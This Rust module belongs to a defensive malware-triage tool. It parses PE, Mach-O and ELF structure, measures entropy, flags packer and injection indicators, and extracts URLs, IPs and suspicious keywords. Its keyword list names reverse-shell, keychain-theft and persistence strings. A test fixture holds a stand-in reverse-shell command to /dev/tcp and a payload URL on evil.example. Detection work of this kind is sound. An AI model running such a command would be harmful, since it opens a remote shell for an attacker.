//! Executable format details (Mach-O, fat/universal, ELF, PE), Shannon
//! entropy (packed/encrypted content shows up near 8 bits/byte), and
//! indicator extraction from printable strings (URLs, IPs, e-mail
//! addresses, suspicious keywords). Pure parsing of bytes on disk.

use std::collections::BTreeSet;
use std::fs::File;
use std::io::Read;
use std::path::Path;

use chrono::DateTime;
use serde::Serialize;

/// How much of a file we read for entropy and strings.
const SCAN_BYTES: usize = 32 << 20;

#[derive(Debug, Clone, Default, Serialize)]
pub struct Deep {
    /// (label, value) facts from the binary header.
    pub format: Vec<(String, String)>,
    /// Bits per byte, 0–8.
    pub entropy: Option<f64>,
    /// (category, value) indicators found in printable strings.
    pub indicators: Vec<(String, String)>,
    pub scanned_bytes: usize,
    /// Sections, imports, linked libraries and structural anomalies.
    pub structure: Structure,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct Section {
    pub name: String,
    pub size: u64,
    /// "r", "w", "x" flags.
    pub perms: String,
    pub entropy: Option<f64>,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct Structure {
    pub sections: Vec<Section>,
    /// Linked libraries (DLLs, dylibs, DT_NEEDED).
    pub libraries: Vec<String>,
    /// PE: library → imported functions.
    pub imports: Vec<(String, Vec<String>)>,
    pub exports: usize,
    /// Things worth a second look, with the reason.
    pub anomalies: Vec<String>,
    /// Capabilities suggested by imports (e.g. "process injection").
    pub capabilities: Vec<String>,
}

fn u16le(b: &[u8], o: usize) -> Option<u16> {
    b.get(o..o + 2).map(|s| u16::from_le_bytes([s[0], s[1]]))
}
fn u32le(b: &[u8], o: usize) -> Option<u32> {
    b.get(o..o + 4).map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}
fn u32be(b: &[u8], o: usize) -> Option<u32> {
    b.get(o..o + 4).map(|s| u32::from_be_bytes([s[0], s[1], s[2], s[3]]))
}
fn u64le(b: &[u8], o: usize) -> Option<u64> {
    b.get(o..o + 8).map(|s| u64::from_le_bytes(s.try_into().unwrap_or([0; 8])))
}
fn cstr(b: &[u8], o: usize, max: usize) -> String {
    let end = b.get(o..).map(|r| r.iter().take(max).position(|c| *c == 0).unwrap_or(max.min(r.len()))).unwrap_or(0);
    b.get(o..o + end).map(|s| String::from_utf8_lossy(s).into_owned()).unwrap_or_default()
}
fn slice_entropy(b: &[u8], off: u64, size: u64) -> Option<f64> {
    let (o, n) = (off as usize, size as usize);
    (n >= 256).then(|| b.get(o..o.saturating_add(n).min(b.len()))).flatten().filter(|s| s.len() >= 256).map(entropy)
}

const PACKER_SECTIONS: &[&str] = &["upx0", "upx1", "upx2", ".aspack", ".adata", ".petite", ".mpress1", ".mpress2", ".nsp0", ".nsp1", ".themida", ".vmp0", ".vmp1", ".enigma1", "pec1", ".packed"];

/// Import combinations that point at a capability.
const CAPABILITIES: &[(&str, &[&str])] = &[
    ("process injection (allocate + write + run code in another process)", &["virtualallocex", "writeprocessmemory", "createremotethread"]),
    ("process hollowing building blocks", &["ntunmapviewofsection", "setthreadcontext", "resumethread"]),
    ("keyboard hooking", &["setwindowshookexa", "setwindowshookexw"]),
    ("keystroke polling", &["getasynckeystate"]),
    ("screen capture", &["bitblt", "getdc"]),
    ("credential access (LSA / SAM)", &["lsaretrieveprivatedata"]),
    ("debugger detection", &["isdebuggerpresent", "checkremotedebuggerpresent"]),
    ("service installation", &["createservicea", "createservicew"]),
    ("registry autostart writes", &["regsetvalueexa", "regsetvalueexw"]),
    ("downloading over HTTP", &["urldownloadtofilea", "urldownloadtofilew", "internetopenurla", "internetopenurlw", "winhttpopen"]),
];

fn pe_structure(b: &[u8], st: &mut Structure) {
    let Some(pe) = u32le(b, 0x3c).map(|o| o as usize).filter(|pe| b.get(*pe..*pe + 4) == Some(b"PE\0\0")) else { return };
    let nsec = u16le(b, pe + 6).unwrap_or(0).min(96) as usize;
    let opt_size = u16le(b, pe + 20).unwrap_or(0) as usize;
    let opt = pe + 24;
    let plus = u16le(b, opt) == Some(0x20b);
    let entry = u32le(b, opt + 16).unwrap_or(0);
    let dirs = opt + if plus { 112 } else { 96 };
    let ndirs = u32le(b, opt + if plus { 108 } else { 92 }).unwrap_or(0).min(16) as usize;
    let sec0 = opt + opt_size;
    // (name, va, vsize, raw_ptr, raw_size, chars)
    let mut secs: Vec<(String, u32, u32, u32, u32, u32)> = Vec::new();
    for i in 0..nsec {
        let o = sec0 + i * 40;
        let Some(raw) = b.get(o..o + 40) else { break };
        let name = String::from_utf8_lossy(&raw[..8]).trim_end_matches('\0').to_string();
        let g = |k: usize| u32le(raw, k).unwrap_or(0);
        secs.push((name, g(12), g(8), g(20), g(16), g(36)));
    }
    let rva = |r: u32| -> Option<usize> {
        secs.iter().find(|s| r >= s.1 && r < s.1 + s.2.max(s.4)).map(|s| (r - s.1 + s.3) as usize)
    };
    for (i, (name, va, vsize, ptr, rsize, ch)) in secs.iter().enumerate() {
        let (r, w, x) = (ch & 0x4000_0000 != 0, ch & 0x8000_0000 != 0, ch & 0x2000_0000 != 0 || ch & 0x20 != 0);
        let perms = format!("{}{}{}", if r { "r" } else { "-" }, if w { "w" } else { "-" }, if x { "x" } else { "-" });
        let e = slice_entropy(b, *ptr as u64, *rsize as u64);
        if w && x {
            st.anomalies.push(format!("section {name} is writable and executable"));
        }
        if PACKER_SECTIONS.contains(&name.to_lowercase().as_str()) {
            st.anomalies.push(format!("section name {name} is used by a known packer"));
        }
        if x && e.is_some_and(|e| e > 7.2) {
            st.anomalies.push(format!("executable section {name} has entropy {:.2} (packed or encrypted code)", e.unwrap_or(0.0)));
        }
        if *rsize == 0 && *vsize > 0x10000 && x {
            st.anomalies.push(format!("section {name} is empty on disk but {} KB in memory (unpacked at run time)", vsize / 1024));
        }
        if entry >= *va && entry < va + vsize.max(rsize) && !x {
            st.anomalies.push(format!("entry point is in non-executable section {name}"));
        }
        if entry >= *va && entry < va + vsize.max(rsize) && i + 1 == secs.len() && secs.len() > 2 {
            st.anomalies.push(format!("entry point is in the last section ({name}), typical of packers"));
        }
        st.sections.push(Section { name: name.clone(), size: (*vsize).max(*rsize) as u64, perms, entropy: e });
    }
    // Imports (data directory 1).
    if ndirs > 1 {
        if let Some(mut d) = u32le(b, dirs + 8).and_then(rva) {
            for _ in 0..512 {
                let (Some(oft), Some(name_rva), Some(ft)) = (u32le(b, d), u32le(b, d + 12), u32le(b, d + 16)) else { break };
                if name_rva == 0 {
                    break;
                }
                let lib = rva(name_rva).map(|o| cstr(b, o, 256)).unwrap_or_default();
                let mut funcs = Vec::new();
                if let Some(mut t) = rva(if oft != 0 { oft } else { ft }) {
                    for _ in 0..4096 {
                        let (v, ord) = if plus {
                            let v = u64le(b, t).unwrap_or(0);
                            (v & 0x7fff_ffff, v & (1 << 63) != 0)
                        } else {
                            let v = u32le(b, t).unwrap_or(0) as u64;
                            (v & 0x7fff_ffff, v & (1 << 31) != 0)
                        };
                        if v == 0 && !ord {
                            break;
                        }
                        funcs.push(if ord { format!("#{}", v & 0xffff) } else { rva(v as u32).map(|o| cstr(b, o + 2, 128)).unwrap_or_default() });
                        t += if plus { 8 } else { 4 };
                    }
                }
                st.libraries.push(lib.clone());
                st.imports.push((lib, funcs));
                d += 20;
            }
        }
    }
    if let Some(e) = u32le(b, dirs).and_then(rva) {
        st.exports = u32le(b, e + 24).unwrap_or(0) as usize;
    }
    let all: Vec<String> = st.imports.iter().flat_map(|(_, f)| f.iter().map(|x| x.to_lowercase())).collect();
    for (cap, need) in CAPABILITIES {
        if need.iter().all(|n| all.iter().any(|a| a == n)) || (need.len() <= 2 && need.iter().any(|n| all.iter().any(|a| a == n))) {
            st.capabilities.push((*cap).into());
        }
    }
    let total: usize = st.imports.iter().map(|(_, f)| f.len()).sum();
    if total > 0 && total <= 8 && all.iter().any(|a| a.starts_with("loadlibrary")) && all.iter().any(|a| a == "getprocaddress") {
        st.anomalies.push(format!("only {total} imports including LoadLibrary + GetProcAddress: the real imports are resolved at run time"));
    }
}

fn macho_structure(b: &[u8], st: &mut Structure) {
    // Universal: analyse the first slice.
    if b.starts_with(&[0xca, 0xfe, 0xba, 0xbe]) {
        if let (Some(off), Some(size)) = (u32be(b, 8 + 8), u32be(b, 8 + 12)) {
            if let Some(slice) = b.get(off as usize..(off as usize + size as usize).min(b.len())) {
                macho_structure(slice, st);
            }
        }
        return;
    }
    if !b.starts_with(&[0xcf, 0xfa, 0xed, 0xfe]) {
        return;
    }
    let ncmds = u32le(b, 16).unwrap_or(0).min(512) as usize;
    let mut o = 32;
    let mut signed = false;
    for _ in 0..ncmds {
        let (Some(cmd), Some(size)) = (u32le(b, o), u32le(b, o + 4)) else { break };
        let size = size as usize;
        if size < 8 {
            break;
        }
        match cmd {
            0x19 => {
                // LC_SEGMENT_64
                let seg = cstr(b, o + 8, 16);
                let maxprot = u32le(b, o + 56).unwrap_or(0);
                let initprot = u32le(b, o + 60).unwrap_or(0);
                let nsects = u32le(b, o + 64).unwrap_or(0).min(256) as usize;
                if initprot & 2 != 0 && initprot & 4 != 0 {
                    st.anomalies.push(format!("segment {seg} is mapped writable and executable"));
                }
                let _ = maxprot;
                for i in 0..nsects {
                    let so = o + 72 + i * 80;
                    let name = cstr(b, so, 16);
                    let ssize = u64le(b, so + 40).unwrap_or(0);
                    let off = u32le(b, so + 48).unwrap_or(0) as u64;
                    let x = initprot & 4 != 0;
                    let e = if off > 0 { slice_entropy(b, off, ssize) } else { None };
                    if name == "__text" && e.is_some_and(|e| e > 7.2) {
                        st.anomalies.push(format!("__text has entropy {:.2} (packed or encrypted code)", e.unwrap_or(0.0)));
                    }
                    let perms = format!("{}{}{}", if initprot & 1 != 0 { "r" } else { "-" }, if initprot & 2 != 0 { "w" } else { "-" }, if x { "x" } else { "-" });
                    st.sections.push(Section { name: format!("{seg},{name}"), size: ssize, perms, entropy: e });
                }
            }
            0xc | 0x8000_0018 | 0x8000_001f | 0x8000_0023 => {
                // LC_LOAD_DYLIB, LC_LOAD_WEAK_DYLIB, LC_REEXPORT_DYLIB, LC_LOAD_UPWARD_DYLIB
                let name_off = u32le(b, o + 8).unwrap_or(0) as usize;
                let lib = cstr(b, o + name_off, size.saturating_sub(name_off));
                if crate::persistence::risky_location(&lib) {
                    st.anomalies.push(format!("links a library from a user-writable location: {lib}"));
                }
                st.libraries.push(lib);
            }
            0x8000_001c => {
                // LC_RPATH
                let p = cstr(b, o + u32le(b, o + 8).unwrap_or(0) as usize, size);
                if p.starts_with("/tmp") || p.starts_with("/private/tmp") || p.contains("/Downloads") {
                    st.anomalies.push(format!("library search path in a writable folder: {p}"));
                }
            }
            0x1d => signed = true,
            0x2c if u32le(b, o + 16).unwrap_or(0) != 0 => {
                st.anomalies.push("binary is encrypted (LC_ENCRYPTION_INFO cryptid set)".into());
            }
            _ => {}
        }
        o += size;
    }
    if !signed {
        st.anomalies.push("no code-signature load command".into());
    }
}

fn elf_structure(b: &[u8], st: &mut Structure) {
    if !b.starts_with(&[0x7f, b'E', b'L', b'F']) || b.get(4) != Some(&2) || b.get(5) != Some(&1) {
        return; // 64-bit little-endian only
    }
    let phoff = u64le(b, 0x20).unwrap_or(0) as usize;
    let shoff = u64le(b, 0x28).unwrap_or(0) as usize;
    let phnum = u16le(b, 0x38).unwrap_or(0).min(256) as usize;
    let shnum = u16le(b, 0x3c).unwrap_or(0).min(512) as usize;
    let shstrndx = u16le(b, 0x3e).unwrap_or(0) as usize;
    for i in 0..phnum {
        let p = phoff + i * 56;
        let (Some(ty), Some(flags)) = (u32le(b, p), u32le(b, p + 4)) else { break };
        if ty == 1 && flags & 2 != 0 && flags & 1 != 0 {
            st.anomalies.push("a loadable segment is writable and executable".into());
        }
        if ty == 0x6474_e551 && flags & 1 != 0 {
            st.anomalies.push("executable stack (PT_GNU_STACK has X)".into());
        }
    }
    // (name_off, type, flags, offset, size, link)
    let sh: Vec<(u32, u32, u64, u64, u64, u32)> = (0..shnum)
        .filter_map(|i| {
            let o = shoff + i * 64;
            Some((u32le(b, o)?, u32le(b, o + 4)?, u64le(b, o + 8)?, u64le(b, o + 24)?, u64le(b, o + 32)?, u32le(b, o + 40)?))
        })
        .collect();
    let strtab = sh.get(shstrndx).map(|s| s.3 as usize).unwrap_or(0);
    for (name_off, ty, flags, off, size, link) in &sh {
        let name = cstr(b, strtab + *name_off as usize, 64);
        if name.is_empty() {
            continue;
        }
        let (w, x) = (flags & 1 != 0, flags & 4 != 0);
        let e = if *ty != 8 { slice_entropy(b, *off, *size) } else { None };
        if w && x {
            st.anomalies.push(format!("section {name} is writable and executable"));
        }
        if x && e.is_some_and(|e| e > 7.2) {
            st.anomalies.push(format!("executable section {name} has entropy {:.2}", e.unwrap_or(0.0)));
        }
        st.sections.push(Section { name: name.clone(), size: *size, perms: format!("r{}{}", if w { "w" } else { "-" }, if x { "x" } else { "-" }), entropy: e });
        if *ty == 6 {
            // .dynamic: DT_NEEDED entries name libraries in the linked string table.
            let dynstr = sh.get(*link as usize).map(|s| s.3 as usize).unwrap_or(0);
            for k in 0..(*size as usize / 16).min(512) {
                let d = *off as usize + k * 16;
                match (u64le(b, d), u64le(b, d + 8)) {
                    (Some(0), _) | (None, _) => break,
                    (Some(1), Some(v)) => st.libraries.push(cstr(b, dynstr + v as usize, 256)),
                    _ => {}
                }
            }
        }
    }
    if sh.is_empty() && phnum > 0 {
        st.anomalies.push("no section headers (stripped or packed)".into());
    }
}

/// Sections, imports and anomalies for PE, Mach-O and ELF.
pub fn structure(b: &[u8]) -> Structure {
    let mut st = Structure::default();
    match b {
        [b'M', b'Z', ..] => pe_structure(b, &mut st),
        [0xcf, 0xfa, 0xed, 0xfe, ..] | [0xca, 0xfe, 0xba, 0xbe, ..] => macho_structure(b, &mut st),
        [0x7f, b'E', b'L', b'F', ..] => elf_structure(b, &mut st),
        _ => {}
    }
    st.anomalies.dedup();
    st
}

fn macho_cpu(cpu: u32) -> String {
    match cpu {
        7 => "x86".into(),
        0x0100_0007 => "x86_64".into(),
        12 => "arm".into(),
        0x0100_000c => "arm64".into(),
        0x0200_000c => "arm64_32".into(),
        18 => "ppc".into(),
        other => format!("cpu {other:#x}"),
    }
}

fn macho_kind(t: u32) -> &'static str {
    match t {
        1 => "object file",
        2 => "executable",
        6 => "dynamic library",
        7 => "dynamic linker",
        8 => "bundle / plug-in",
        11 => "kernel extension",
        _ => "other",
    }
}

/// Header facts for Mach-O, universal, ELF and PE files.
pub fn header(b: &[u8]) -> Vec<(String, String)> {
    let mut f: Vec<(String, String)> = Vec::new();
    let mut put = |k: &str, v: String| f.push((k.to_string(), v));
    match b {
        // Mach-O 64/32, little-endian.
        [0xcf, 0xfa, 0xed, 0xfe, ..] | [0xce, 0xfa, 0xed, 0xfe, ..] => {
            put("Format", if b[0] == 0xcf { "Mach-O 64-bit".into() } else { "Mach-O 32-bit".into() });
            if let (Some(cpu), Some(kind), Some(ncmds)) = (u32le(b, 4), u32le(b, 12), u32le(b, 16)) {
                put("Architecture", macho_cpu(cpu));
                put("Kind", macho_kind(kind).into());
                put("Load commands", ncmds.to_string());
            }
            if let Some(flags) = u32le(b, 24) {
                let mut v = Vec::new();
                if flags & 0x0020_0000 != 0 {
                    v.push("PIE");
                }
                if flags & 0x0200_0000 != 0 {
                    v.push("no heap execution");
                }
                if !v.is_empty() {
                    put("Hardening", v.join(", "));
                }
            }
        }
        // Universal ("fat") binary: big-endian header + arch table.
        [0xca, 0xfe, 0xba, 0xbe, ..] => {
            let n = u32be(b, 4).unwrap_or(0).min(16) as usize;
            let archs: Vec<String> = (0..n).filter_map(|i| u32be(b, 8 + i * 20).map(macho_cpu)).collect();
            put("Format", "Mach-O universal binary".into());
            put("Architectures", archs.join(", "));
        }
        [0x7f, b'E', b'L', b'F', ..] => {
            let class = if b.get(4) == Some(&2) { "64-bit" } else { "32-bit" };
            put("Format", format!("ELF {class}"));
            let kind = match u16le(b, 16) {
                Some(2) => "executable",
                Some(3) => "shared object / PIE executable",
                Some(1) => "relocatable",
                Some(4) => "core dump",
                _ => "other",
            };
            put("Kind", kind.into());
            let machine = match u16le(b, 18) {
                Some(0x3e) => "x86_64".to_string(),
                Some(0xb7) => "aarch64".to_string(),
                Some(0x03) => "x86".to_string(),
                Some(0x28) => "arm".to_string(),
                Some(0xf3) => "riscv".to_string(),
                Some(m) => format!("machine {m:#x}"),
                None => "?".into(),
            };
            put("Architecture", machine);
        }
        [b'M', b'Z', ..] => {
            let Some(pe) = u32le(b, 0x3c).map(|o| o as usize) else {
                put("Format", "DOS executable".into());
                return f;
            };
            if b.get(pe..pe + 4) != Some(b"PE\0\0") {
                put("Format", "DOS executable (no PE header in scanned bytes)".into());
                return f;
            }
            let machine = match u16le(b, pe + 4) {
                Some(0x8664) => "x86_64".to_string(),
                Some(0x14c) => "x86".to_string(),
                Some(0xaa64) => "arm64".to_string(),
                Some(m) => format!("machine {m:#x}"),
                None => "?".into(),
            };
            let sections = u16le(b, pe + 6).unwrap_or(0);
            let ts = u32le(b, pe + 8).unwrap_or(0);
            let chars = u16le(b, pe + 22).unwrap_or(0);
            let opt = pe + 24;
            let plus = u16le(b, opt) == Some(0x20b);
            let subsystem = u16le(b, opt + 68).map(|s| match s {
                1 => "native / driver",
                2 => "Windows GUI",
                3 => "console",
                _ => "other",
            });
            put("Format", format!("PE{} ({})", if plus { "32+" } else { "32" }, if chars & 0x2000 != 0 { "DLL" } else { "executable" }));
            put("Architecture", machine);
            put("Sections", sections.to_string());
            if let Some(s) = subsystem {
                put("Subsystem", s.into());
            }
            if ts > 0 {
                // Often faked or zeroed (reproducible builds), so label it.
                let t = DateTime::from_timestamp(ts as i64, 0).map(|t| t.format("%Y-%m-%d %H:%M:%S UTC").to_string()).unwrap_or_default();
                put("Linker timestamp", format!("{t} (can be forged)"));
            }
            let dll_chars = u16le(b, opt + 70).unwrap_or(0);
            let mut hard = Vec::new();
            if dll_chars & 0x0040 != 0 {
                hard.push("ASLR");
            }
            if dll_chars & 0x0100 != 0 {
                hard.push("DEP");
            }
            if dll_chars & 0x4000 != 0 {
                hard.push("CFG");
            }
            put("Hardening", if hard.is_empty() { "none".into() } else { hard.join(", ") });
        }
        _ => {}
    }
    f
}

/// Shannon entropy in bits per byte.
pub fn entropy(b: &[u8]) -> f64 {
    if b.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &x in b {
        counts[x as usize] += 1;
    }
    let n = b.len() as f64;
    counts.iter().filter(|c| **c > 0).map(|&c| {
        let p = c as f64 / n;
        -p * p.log2()
    }).sum()
}

fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    parts.len() == 4 && parts.iter().all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u8>().is_ok()) && !s.starts_with("0.")
}

/// Printable ASCII runs of at least `min` bytes.
fn strings(b: &[u8], min: usize) -> impl Iterator<Item = &str> {
    b.split(|c| !(0x20..0x7f).contains(c)).filter(move |s| s.len() >= min).filter_map(|s| std::str::from_utf8(s).ok())
}

const KEYWORDS: &[(&str, &str)] = &[
    ("/dev/tcp/", "reverse-shell path"),
    ("bash -i", "interactive shell"),
    ("launchctl load", "installs a launch item"),
    ("launchagents", "touches LaunchAgents"),
    ("crontab", "touches cron"),
    ("currentversion\\run", "Run-key persistence"),
    ("schtasks", "scheduled-task creation"),
    ("vssadmin delete shadows", "deletes shadow copies"),
    ("security find-generic-password", "reads keychain items"),
    ("login.keychain", "references the keychain"),
    ("sqlite3", "SQLite access (browser data?)"),
    ("cookies", "references cookies"),
    ("osascript", "AppleScript execution"),
    ("powershell", "PowerShell"),
    ("frombase64string", "base64 decoding"),
    ("virtualalloc", "allocates executable memory"),
    ("createremotethread", "remote thread creation"),
    ("writeprocessmemory", "writes another process's memory"),
    ("ptrace", "process tracing"),
    ("keylog", "keylogging"),
    ("cgeventtap", "keyboard/mouse event tap"),
];

/// URLs, IPv4 addresses, e-mail addresses and keyword hits, capped.
pub fn indicators(b: &[u8]) -> Vec<(String, String)> {
    let mut urls = BTreeSet::new();
    let mut ips = BTreeSet::new();
    let mut emails = BTreeSet::new();
    let mut keys = BTreeSet::new();
    for s in strings(b, 6) {
        let lower = s.to_lowercase();
        for scheme in ["http://", "https://", "ftp://", "ws://", "wss://"] {
            let mut rest = lower.as_str();
            while let Some(i) = rest.find(scheme) {
                let url: String = rest[i..].chars().take_while(|c| !c.is_whitespace() && !"\"'<>()`".contains(*c)).take(200).collect();
                if url.len() > scheme.len() + 3 && urls.len() < 60 {
                    urls.insert(url);
                }
                rest = &rest[i + scheme.len()..];
            }
        }
        for tok in s.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
            let tok = tok.trim_matches('.');
            if is_ipv4(tok) && tok != "127.0.0.1" && tok != "0.0.0.0" && !tok.starts_with("255.") && ips.len() < 60 {
                ips.insert(tok.to_string());
            }
        }
        for tok in s.split(|c: char| c.is_whitespace() || "<>()\"',;".contains(c)) {
            if let Some((user, domain)) = tok.split_once('@') {
                if !user.is_empty() && domain.contains('.') && !domain.ends_with('.') && domain.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') && emails.len() < 30 {
                    emails.insert(tok.to_lowercase());
                }
            }
        }
        for (k, why) in KEYWORDS {
            if lower.contains(k) {
                keys.insert(format!("{why} (\"{k}\")"));
            }
        }
    }
    let mut out = Vec::new();
    out.extend(keys.into_iter().map(|v| ("behavior".to_string(), v)));
    out.extend(urls.into_iter().map(|v| ("url".to_string(), v)));
    out.extend(ips.into_iter().map(|v| ("ip".to_string(), v)));
    out.extend(emails.into_iter().map(|v| ("email".to_string(), v)));
    out
}

pub fn analyze(path: &Path) -> std::io::Result<Deep> {
    let mut buf = Vec::new();
    File::open(path)?.take(SCAN_BYTES as u64).read_to_end(&mut buf)?;
    Ok(Deep { format: header(&buf), entropy: Some(entropy(&buf)), indicators: indicators(&buf), scanned_bytes: buf.len(), structure: structure(&buf) })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn headers() {
        let mut macho = vec![0xcf, 0xfa, 0xed, 0xfe];
        macho.extend(0x0100_000cu32.to_le_bytes());
        macho.extend([0u8; 4]);
        macho.extend(2u32.to_le_bytes());
        macho.extend(20u32.to_le_bytes());
        macho.extend([0u8; 4]);
        macho.extend(0x0020_0000u32.to_le_bytes());
        let h = header(&macho);
        assert!(h.contains(&("Architecture".into(), "arm64".into())));
        assert!(h.contains(&("Kind".into(), "executable".into())));

        let mut elf = vec![0x7f, b'E', b'L', b'F', 2];
        elf.resize(16, 0);
        elf.extend(3u16.to_le_bytes());
        elf.extend(0x3eu16.to_le_bytes());
        let h = header(&elf);
        assert!(h.contains(&("Architecture".into(), "x86_64".into())));

        let mut pe = vec![0u8; 0x200];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        pe[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
        pe[0x88..0x8c].copy_from_slice(&1_600_000_000u32.to_le_bytes());
        let h = header(&pe);
        assert!(h.iter().any(|(k, v)| k == "Linker timestamp" && v.starts_with("2020-09-13")));
    }

    #[test]
    fn entropy_and_indicators() {
        assert_eq!(entropy(&[0u8; 100]), 0.0);
        let all: Vec<u8> = (0..=255u8).collect();
        assert!((entropy(&all) - 8.0).abs() < 1e-9);
        let blob = b"junk\0\0connect http://evil.example/payload.sh then 45.33.32.156 mail admin@evil.example \0 bash -i >& /dev/tcp/1.2.3.4/4444";
        let ind = indicators(blob);
        assert!(ind.contains(&("url".into(), "http://evil.example/payload.sh".into())));
        assert!(ind.iter().any(|(k, v)| k == "ip" && v == "45.33.32.156"));
        assert!(ind.iter().any(|(k, v)| k == "email" && v == "admin@evil.example"));
        assert!(ind.iter().any(|(k, v)| k == "behavior" && v.contains("reverse-shell")));
    }

    fn synthetic_pe() -> Vec<u8> {
        let mut b = vec![0u8; 0x800];
        b[0..2].copy_from_slice(b"MZ");
        b[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        b[0x80..0x84].copy_from_slice(b"PE\0\0");
        b[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
        b[0x86..0x88].copy_from_slice(&2u16.to_le_bytes());
        b[0x94..0x96].copy_from_slice(&240u16.to_le_bytes());
        let opt = 0x98;
        b[opt..opt + 2].copy_from_slice(&0x20bu16.to_le_bytes());
        b[opt + 16..opt + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        b[opt + 108..opt + 112].copy_from_slice(&16u32.to_le_bytes());
        b[opt + 112 + 8..opt + 112 + 12].copy_from_slice(&0x2000u32.to_le_bytes());
        b[opt + 112 + 12..opt + 112 + 16].copy_from_slice(&0x100u32.to_le_bytes());
        let mut sec = |i: usize, name: &[u8], va: u32, raw: u32, chars: u32| {
            let o = opt + 240 + i * 40;
            b[o..o + name.len()].copy_from_slice(name);
            b[o + 8..o + 12].copy_from_slice(&0x200u32.to_le_bytes());
            b[o + 12..o + 16].copy_from_slice(&va.to_le_bytes());
            b[o + 16..o + 20].copy_from_slice(&0x200u32.to_le_bytes());
            b[o + 20..o + 24].copy_from_slice(&raw.to_le_bytes());
            b[o + 36..o + 40].copy_from_slice(&chars.to_le_bytes());
        };
        sec(0, b".text", 0x1000, 0x400, 0x6000_0020);
        sec(1, b"UPX1", 0x2000, 0x600, 0xE000_0020);
        // Import descriptor at RVA 0x2000 (file 0x600).
        let d = 0x600;
        b[d..d + 4].copy_from_slice(&0x2040u32.to_le_bytes());
        b[d + 12..d + 16].copy_from_slice(&0x2080u32.to_le_bytes());
        b[d + 16..d + 20].copy_from_slice(&0x2040u32.to_le_bytes());
        let names = [(0x2090u32, "VirtualAllocEx"), (0x20b0, "WriteProcessMemory"), (0x20d0, "CreateRemoteThread")];
        for (i, (r, _)) in names.iter().enumerate() {
            let t = 0x640 + i * 8;
            b[t..t + 8].copy_from_slice(&(*r as u64).to_le_bytes());
        }
        b[0x680..0x680 + 12].copy_from_slice(b"KERNEL32.dll");
        for (r, n) in names {
            let o = (r - 0x2000 + 0x600) as usize + 2;
            b[o..o + n.len()].copy_from_slice(n.as_bytes());
        }
        b
    }

    #[test]
    fn pe_sections_imports_and_anomalies() {
        let st = structure(&synthetic_pe());
        assert_eq!(st.sections.len(), 2);
        assert_eq!(st.sections[0].perms, "r-x");
        assert_eq!(st.libraries, vec!["KERNEL32.dll"]);
        assert_eq!(st.imports[0].1, vec!["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]);
        assert!(st.capabilities.iter().any(|c| c.contains("injection")), "{st:?}");
        assert!(st.anomalies.iter().any(|a| a.contains("writable and executable")));
        assert!(st.anomalies.iter().any(|a| a.contains("packer")));
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn real_macho_libraries_match_otool() {
        let b = std::fs::read("/bin/ls").unwrap();
        let st = structure(&b);
        assert!(st.libraries.iter().any(|l| l == "/usr/lib/libSystem.B.dylib"), "{:?}", st.libraries);
        assert!(st.sections.iter().any(|s| s.name == "__TEXT,__text" && s.perms.contains('x')));
        assert!(!st.anomalies.iter().any(|a| a.contains("code-signature")), "/bin/ls is signed: {:?}", st.anomalies);
    }
}

#[cfg(test)]
mod dump {
    /// Prints linked libraries of the files in PW_LIBS (":"-separated)
    /// for comparison with other tools; no-op otherwise.
    #[test]
    fn dump_libraries() {
        let Ok(files) = std::env::var("PW_LIBS") else { return };
        for f in files.split(':') {
            let st = super::structure(&std::fs::read(f).unwrap());
            println!("LIBS {f} {}", st.libraries.join(","));
        }
    }
}
